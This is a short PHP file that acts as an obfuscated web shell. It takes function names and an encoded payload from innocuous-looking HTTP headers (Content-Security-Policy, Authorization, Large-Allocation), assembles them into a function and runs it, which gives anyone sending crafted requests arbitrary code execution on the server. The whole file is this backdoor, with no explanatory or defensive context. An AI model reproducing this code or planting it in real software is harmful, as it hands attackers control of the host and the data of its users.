<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $dba_insertion = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Authorization']($_HEADERS['Large-Allocation']));
    $dba_insertion();
}